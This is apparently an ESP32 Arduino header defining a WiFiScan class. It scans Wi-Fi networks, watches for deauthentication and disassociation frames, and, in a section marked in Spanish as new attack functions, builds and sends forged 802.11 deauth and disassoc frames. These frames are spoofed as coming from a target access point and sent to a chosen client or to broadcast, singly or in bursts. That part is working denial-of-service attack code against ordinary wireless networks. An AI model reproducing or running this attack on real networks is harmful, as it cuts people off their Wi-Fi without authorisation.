#pragma once

#include <WiFi.h>
#include <esp_wifi.h>

class WiFiScan {
 public:
  struct MonitorState {
    uint32_t deauthFrames;
    uint32_t disassocFrames;
    int8_t rssi;
    uint8_t channel;
    uint8_t subtype;
    uint8_t source[6];
    uint8_t destination[6];
  };

  struct AttackStats {
    uint32_t deauthSent;
    uint32_t disassocSent;
  };

  void begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
  }

  int scan() {
    stopMonitor();
    stopAttack();
    begin();
    return WiFi.scanNetworks(false, true);
  }

  String ssid(int index) const { return WiFi.SSID(index); }
  String bssid(int index) const { return WiFi.BSSIDstr(index); }
  int32_t channel(int index) const { return WiFi.channel(index); }
  int32_t rssi(int index) const { return WiFi.RSSI(index); }
  void clearScan() { WiFi.scanDelete(); }

  bool startMonitor(const char* bssidText, uint8_t channel) {
    wifi_promiscuous_filter_t filter = {};
    esp_err_t error;

    if (channel < 1 || channel > 14 || !parseMac(bssidText, monitorBssid_)) return false;
    stopMonitor();
    stopAttack();
    begin();

    error = esp_wifi_set_promiscuous(false);
    if (error == ESP_OK) error = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (error == ESP_OK) error = esp_wifi_set_mode(WIFI_MODE_NULL);
    if (error == ESP_OK) error = esp_wifi_start();
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    if (error == ESP_OK) error = esp_wifi_set_promiscuous_filter(&filter);
    if (error == ESP_OK) error = esp_wifi_set_promiscuous_rx_cb(receive);
    if (error == ESP_OK) error = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    resetState();
    monitorChannel_ = channel;
    activeMonitor() = this;
    running_ = true;
    if (error == ESP_OK) error = esp_wifi_set_promiscuous(true);
    if (error == ESP_OK) return true;

    running_ = false;
    activeMonitor() = nullptr;
    esp_wifi_set_promiscuous(false);
    return false;
  }

  void stopMonitor() {
    if (!running_) return;
    running_ = false;
    esp_wifi_set_promiscuous(false);
    if (activeMonitor() == this) activeMonitor() = nullptr;
  }

  bool monitoring() const { return running_; }
  uint8_t monitorChannel() const { return monitorChannel_; }

  MonitorState monitorState() const {
    MonitorState result;
    result.deauthFrames = state_.deauthFrames;
    result.disassocFrames = state_.disassocFrames;
    result.rssi = state_.rssi;
    result.channel = state_.channel;
    result.subtype = state_.subtype;
    memcpy(result.source, (const void*)state_.source, sizeof(result.source));
    memcpy(result.destination, (const void*)state_.destination, sizeof(result.destination));
    return result;
  }

  // ============ NUEVAS FUNCIONES DE ATAQUE ============
  
  bool startAttack(const char* bssidText, uint8_t channel, const char* clientMacText = nullptr) {
    esp_err_t error;
    
    if (channel < 1 || channel > 14 || !parseMac(bssidText, attackBssid_)) return false;
    
    // Si se proporciona MAC de cliente, parsearla
    if (clientMacText && !parseMac(clientMacText, attackClient_)) {
      return false;
    }
    
    stopMonitor();
    stopAttack();
    begin();

    error = esp_wifi_set_promiscuous(false);
    if (error == ESP_OK) error = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (error == ESP_OK) error = esp_wifi_set_mode(WIFI_MODE_NULL);
    if (error == ESP_OK) error = esp_wifi_start();
    if (error == ESP_OK) error = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (error == ESP_OK) error = esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (error == ESP_OK) error = esp_wifi_set_promiscuous(true);
    
    attackChannel_ = channel;
    attackRunning_ = true;
    attackStats_.deauthSent = 0;
    attackStats_.disassocSent = 0;
    
    if (error == ESP_OK) return true;
    
    attackRunning_ = false;
    esp_wifi_set_promiscuous(false);
    return false;
  }

  void stopAttack() {
    if (!attackRunning_) return;
    attackRunning_ = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_STA);
  }

  bool attackRunning() const { return attackRunning_; }

  AttackStats getAttackStats() const {
    AttackStats result;
    result.deauthSent = attackStats_.deauthSent;
    result.disassocSent = attackStats_.disassocSent;
    return result;
  }

  // Enviar un paquete de deautenticación
  bool sendDeauth(uint16_t reasonCode = 7) {
    if (!attackRunning_) return false;
    
    uint8_t deauthFrame[26] = {
      0xc0, 0x00,           // Frame Control: Deauthentication
      0x00, 0x00,           // Duration
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP BSSID)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (client or broadcast)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
      0x00, 0x00,           // Sequence control
      (reasonCode & 0xFF),  // Reason code low
      (reasonCode >> 8)     // Reason code high
    };
    
    // Destino: si tenemos cliente específico, usarlo; si no, broadcast
    if (attackClient_[0] || attackClient_[1] || attackClient_[2] || 
        attackClient_[3] || attackClient_[4] || attackClient_[5]) {
      memcpy(deauthFrame + 4, attackClient_, 6);  // Destination = client
    } else {
      memset(deauthFrame + 4, 0xFF, 6);  // Broadcast
    }
    
    // Source = AP (para que parezca que viene del AP)
    memcpy(deauthFrame + 10, attackBssid_, 6);
    
    // BSSID = AP
    memcpy(deauthFrame + 16, attackBssid_, 6);
    
    return sendRawFrame(deauthFrame, sizeof(deauthFrame));
  }

  // Enviar un paquete de disasociación
  bool sendDisassoc(uint16_t reasonCode = 8) {
    if (!attackRunning_) return false;
    
    uint8_t disassocFrame[26] = {
      0xa0, 0x00,           // Frame Control: Disassociation
      0x00, 0x00,           // Duration
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
      0x00, 0x00,           // Sequence control
      (reasonCode & 0xFF),  // Reason code low
      (reasonCode >> 8)     // Reason code high
    };
    
    if (attackClient_[0] || attackClient_[1] || attackClient_[2] || 
        attackClient_[3] || attackClient_[4] || attackClient_[5]) {
      memcpy(disassocFrame + 4, attackClient_, 6);
    } else {
      memset(disassocFrame + 4, 0xFF, 6);
    }
    
    memcpy(disassocFrame + 10, attackBssid_, 6);
    memcpy(disassocFrame + 16, attackBssid_, 6);
    
    return sendRawFrame(disassocFrame, sizeof(disassocFrame));
  }

  // Enviar múltiples deauths en ráfaga
  void sendBurstDeauth(int count, uint16_t reasonCode = 7) {
    if (!attackRunning_) return;
    for (int i = 0; i < count; i++) {
      if (!attackRunning_) break;
      sendDeauth(reasonCode);
      delay(10); // Pequeña pausa entre paquetes
    }
  }

 private:
  static WiFiScan*& activeMonitor() {
    static WiFiScan* instance = nullptr;
    return instance;
  }

  static bool sameMac(const uint8_t* left, const uint8_t* right) {
    return memcmp(left, right, 6) == 0;
  }

  static int hexNibble(char value) {
    if (value >= '0' && value <= '9') return value - '0';
    if (value >= 'a' && value <= 'f') return value - 'a' + 10;
    if (value >= 'A' && value <= 'F') return value - 'A' + 10;
    return -1;
  }

  static bool parseMac(const char* text, uint8_t* output) {
    if (!text || strlen(text) != 17) return false;
    for (uint8_t i = 0; i < 6; ++i) {
      int high = hexNibble(text[i * 3]);
      int low = hexNibble(text[i * 3 + 1]);
      if (high < 0 || low < 0 || (i < 5 && text[i * 3 + 2] != ':')) return false;
      output[i] = (uint8_t)((high << 4) | low);
    }
    return true;
  }

  static void receive(void* buffer, wifi_promiscuous_pkt_type_t type) {
    WiFiScan* self = activeMonitor();
    const wifi_promiscuous_pkt_t* packet;
    const uint8_t* frame;
    uint8_t subtype;

    if (!self || !self->running_ || type != WIFI_PKT_MGMT || !buffer) return;
    packet = (const wifi_promiscuous_pkt_t*)buffer;
    if (packet->rx_ctrl.sig_len < 24) return;
    frame = packet->payload;
    subtype = frame[0] & 0xfc;
    if (subtype != 0xc0 && subtype != 0xa0) return;
    if (!sameMac(frame + 4, self->monitorBssid_) &&
        !sameMac(frame + 10, self->monitorBssid_) &&
        !sameMac(frame + 16, self->monitorBssid_)) return;

    self->state_.rssi = packet->rx_ctrl.rssi;
    self->state_.channel = packet->rx_ctrl.channel;
    self->state_.subtype = subtype;
    memcpy((void*)self->state_.destination, frame + 4, 6);
    memcpy((void*)self->state_.source, frame + 10, 6);
    if (subtype == 0xc0) ++self->state_.deauthFrames;
    else ++self->state_.disassocFrames;
  }

  bool sendRawFrame(const uint8_t* frame, size_t length) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false);
    if (err == ESP_OK) {
      if (frame[0] == 0xc0) {
        attackStats_.deauthSent++;
      } else if (frame[0] == 0xa0) {
        attackStats_.disassocSent++;
      }
      return true;
    }
    return false;
  }

  void resetState() {
    state_.deauthFrames = 0;
    state_.disassocFrames = 0;
    state_.rssi = 0;
    state_.channel = 0;
    state_.subtype = 0;
    memset((void*)state_.source, 0, sizeof(state_.source));
    memset((void*)state_.destination, 0, sizeof(state_.destination));
  }

  // Variables de monitoreo
  uint8_t monitorBssid_[6] = {};
  uint8_t monitorChannel_ = 0;
  volatile bool running_ = false;
  volatile MonitorState state_ = {};

  // Variables de ataque
  uint8_t attackBssid_[6] = {};
  uint8_t attackClient_[6] = {};  // Si está todo en 0, broadcast
  uint8_t attackChannel_ = 0;
  volatile bool attackRunning_ = false;
  volatile AttackStats attackStats_ = {};
};
